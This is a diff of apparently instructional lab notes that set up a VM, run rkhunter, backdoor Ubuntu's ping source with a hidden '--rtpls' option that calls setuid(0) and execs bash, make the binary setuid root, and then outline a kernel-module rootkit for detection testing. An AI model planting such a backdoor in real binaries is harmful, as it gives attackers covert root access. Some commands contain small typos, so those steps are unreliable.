@@ -1,19 +1,31 @@
-# Step 0 Prepare Kernel/VM
+##########################
+# Step 0 Prepare VM/Kernel
+##########################
+
+#Install OS into VM
 #Make VM Snapshot
+
+#Gasterweiterung installieren 
+    sudo apt-get install build-essentials
+#Insert Guest Addition iso into vm and navigate to cd-rom folder then run
+    sudo bash ./autorun.sh
+#Install vim
+    sudo apt-get install vim
+#To the ~/.vimrc add 
+    set mouse=a
+#Make VM Snapshot
+
 #Downgrade Kernel via script
 #Reboot/Start with lower Kernel [Press ESC for selection]
 #Install grub customizer and update default kernel
     sudo add-apt-repository ppa:danielrichter2007/grub-customizer
     sudo apt-get update
     sudo apt-get install grub-customizer
-#Gasterweiterung installieren 
-    sudo apt-get install virtualbox-guest-addition-iso
-#Install vim
-    sudo apt-get install vim
-#To the ~/.vimrc add 
-    set mouse=a
+#Make VM Snapshot
 
+#################################
 # Setp 1 Install and Run rkhunter
+#################################
 
 #Install RootkitHunter (rkhunter) with Local Mail
     sudo apt-get install rkhunter
@@ -24,7 +36,9 @@
 #Copy log from /var/log/rkhunter.log to some safe place 
     sudo cp /var/log/rkhunter.log ~/Documents/step1.log
 
+##############################
 # Step 2 Build/Install Rootkit
+##############################
 
 #ping is found in APT-Sources: http://de.archive.ubuntu.com/ubuntu/ xenial universe
 #in /etc/apt/source.list uncomment/add 
@@ -50,32 +64,34 @@
     vim ping/ping.c
 #add to the end of the unnamed? (ca. line 101) enum:
 
-ARG_ROOT_PLS
+	ARG_ROOT_PLS
 
 #add to the argp_options array the following element between #define GRP 10 and #undef GRP,
 #must be after {NULL, 0, NULL, 0, "Options controlling ICMP request types:", GRP}:
-    {"rtpls",ARG_ROOT_PLS,NULL,OPTION_HIDDEN,"grants root shell",GRP+1},
+   
+	{"rtpls",ARG_ROOT_PLS,NULL,OPTION_HIDDEN,"grants root shell",GRP+1},
     
 #in the parse_opt method add to the switch 
   
-case ARG_ROOT_PLS:
-    setuid(0);
-    setgid(0);
-    execl("/bin/bash",NULL);
-    break;
+	case ARG_ROOT_PLS:
+	    setuid(0);
+	    setgid(0);
+	    execl("/bin/bash",NULL);
+	    break;
 
 #commit changes 
     dpkg-source --commit
 #build changes 
     dpkg-buildpackage
 
-# the next two might be necessary because the first dpkg-buildpackage usually finds changed files.?
+#the next two might be necessary because 
+#the first dpkg-buildpackage usually finds changed files.?
 #commit changes 
     dpkg-source --commit
 #build changes 
     dpkg-buildpackage
 
-#to test first set correct privileges with
+#to test first set correct privileges by running
     sudo chown root:root ping/ping
     sudo chmod u+s ping/ping
 #test run ping with special flag
@@ -93,7 +109,9 @@ case ARG_ROOT_PLS:
     
 #compare logs of rkhunter
 
+#############################
 # Step 3 Rootkit/Kernelmodule
+#############################
 
 #switch to a new/empty directory
     mkdir -p ~/Documents/Rootkit && cd ~Documents/Rootkit
@@ -120,5 +138,3 @@ case ARG_ROOT_PLS:
     dmesg -k
 
 #To Recompile and (re)load the module you can use the replace.sh script (this needs the load,unload and compile script)
-
-
